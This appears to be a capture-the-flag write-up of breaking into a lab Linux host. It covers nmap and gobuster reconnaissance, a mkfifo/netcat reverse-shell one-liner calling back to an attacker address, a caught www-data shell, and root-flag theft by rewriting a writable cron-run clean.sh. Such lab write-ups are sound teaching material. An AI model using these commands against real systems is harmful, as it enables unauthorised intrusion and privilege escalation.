I started with the nmap scan 
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.201.81.237 -vv  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 07:55 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
Initiating Ping Scan at 07:55
Scanning 10.201.81.237 [4 ports]
Completed Ping Scan at 07:55, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:55
Completed Parallel DNS resolution of 1 host. at 07:55, 0.03s elapsed
Initiating SYN Stealth Scan at 07:55
Scanning 10.201.81.237 [1000 ports]
Discovered open port 22/tcp on 10.201.81.237
Discovered open port 80/tcp on 10.201.81.237
Completed SYN Stealth Scan at 07:55, 4.46s elapsed (1000 total ports)
Initiating Service scan at 07:55
Scanning 2 services on 10.201.81.237
Completed Service scan at 07:55, 6.63s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.201.81.237
Retrying OS detection (try #2) against 10.201.81.237
WARNING: OS didn't match until try #2
Initiating Traceroute at 07:55
Completed Traceroute at 07:55, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 07:55
Completed Parallel DNS resolution of 2 hosts. at 07:55, 6.55s elapsed
NSE: Script scanning 10.201.81.237.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 7.98s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 1.10s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
Nmap scan report for 10.201.81.237
Host is up, received reset ttl 61 (0.29s latency).
Scanned at 2025-09-07 07:55:11 IST for 35s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1FkWVdXpiZN4JOheh/PVSTjXUgnhMNTFvHNzlip8x6vsFTwIwtP0+5xlYGjtLorEAS0KpJLtpzFO4p4PvEzMC40SY8E+i4LaiXHcMsJrbhIozUjZssBnbfgYPiwCzMICKygDSfG83zCC/ZiXeJKWfVEvpCVX1g5Al16mzQQnB3qPyz8TmSQ+Kgy7GRc+nnPvPbAdh8meVGcSl9bzGuXoFFEAH5RS8D92JpWDRuTVqCXGxZ4t4WgboFPncvau07A3Kl8BoeE8kDa3DUbPYyn3gwJd55khaJSxkKKlAB/f98zXfQnU0RQbiAlC88jD2TmK8ovd2IGmtqbuenHcNT01D
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3zR5EsH+zXjBa4GNOE8Vlf04UROD9GrpAgx0mRcrDQvUdmaF0hYse2KixpRS8Pu1qhWKVRP7nz0LX5nbzb4i4=
|   256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKsS7+8A3OfoY8qtnKrVrjFss8LQhVeMqXeDnESa6Do
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/7%OT=22%CT=1%CU=30444%PV=Y%DS=4%DC=T%G=Y%TM=68BCED2A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=F7%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW
OS:6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%
OS:W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508N
OS:NSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 18.499 days (since Tue Aug 19 19:56:55 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   222.97 ms 10.8.0.1
2   ... 3
4   293.38 ms 10.201.81.237

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:55
Completed NSE at 07:55, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.84 seconds
           Raw packets sent: 1330 (60.116KB) | Rcvd: 1041 (43.072KB)
```
With this I can identify that port 22 -> ssh and port 80 -> http are open now .
<img width="1596" height="739" alt="image" src="https://github.com/user-attachments/assets/2d8bc2b9-309d-4e1e-99b0-dc14fb5061e1" />
Next I do the dirsearching.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ gobuster dir -u http://10.201.81.237/ -w /usr/share/wordlists/dirb/big.txt -t 100                                             
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.81.237/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 401) [Size: 460]
/images               (Status: 301) [Size: 315] [--> http://10.201.81.237/images/]
/js                   (Status: 301) [Size: 311] [--> http://10.201.81.237/js/]
/server-status        (Status: 403) [Size: 278]
/tmp                  (Status: 301) [Size: 312] [--> http://10.201.81.237/tmp/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
There is admin page need to login, I will move with this.
I started the intercept the request.
<img width="1573" height="491" alt="image" src="https://github.com/user-attachments/assets/683ec1be-3dcc-4759-9568-c4b26ee9bd5e" />
Here I can obatain the webshell get the reverse shell as www-data
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
I used this script to obtain the webshell
<img width="1581" height="455" alt="image" src="https://github.com/user-attachments/assets/5ce40f0a-792f-4366-b1f9-3e51c2aeefd9" />
Listen the port and get the shell as www-data but I tried with that i could not obatain the shell and I tried to upload shell in file
file get the reverse shell
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.183.109] from (UNKNOWN) [10.201.81.237] 49466
Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:11:01 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (2044): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmv:/$ 
```
I got the root flag
```bash
www-data@dmv:/var/www/html/tmp$ cat clean.sh
cat /root/root.txt >>rootflag.txt
n.shdata@dmv:/var/www/html/tmp$ echo "cat /root/flag.txt >> rootflag.txt" > clea 
www-data@dmv:/var/www/html/tmp$ ls
clean.sh  rootflag.txt
www-data@dmv:/var/www/html/tmp$ ls -la
total 16
drwxr-xr-x 2 www-data www-data 4096 Sep  7 03:20 .
drwxr-xr-x 6 www-data www-data 4096 Sep  7 03:09 ..
-rw-r--r-- 1 www-data www-data   35 Sep  7 03:24 clean.sh
-rw-rw-rw- 1 www-data www-data  156 Sep  7 03:24 rootflag.txt
www-data@dmv:/var/www/html/tmp$ ls -la
total 16
drwxr-xr-x 2 www-data www-data 4096 Sep  7 03:20 .
drwxr-xr-x 6 www-data www-data 4096 Sep  7 03:09 ..
-rw-r--r-- 1 www-data www-data   35 Sep  7 03:24 clean.sh
-rw-rw-rw- 1 www-data www-data  156 Sep  7 03:24 rootflag.txt
www-data@dmv:/var/www/html/tmp$ ls -la
total 16
drwxr-xr-x 2 www-data www-data 4096 Sep  7 03:20 .
drwxr-xr-x 6 www-data www-data 4096 Sep  7 03:09 ..
-rw-r--r-- 1 www-data www-data   35 Sep  7 03:24 clean.sh
-rw-rw-rw- 1 www-data www-data  156 Sep  7 03:24 rootflag.txt
```

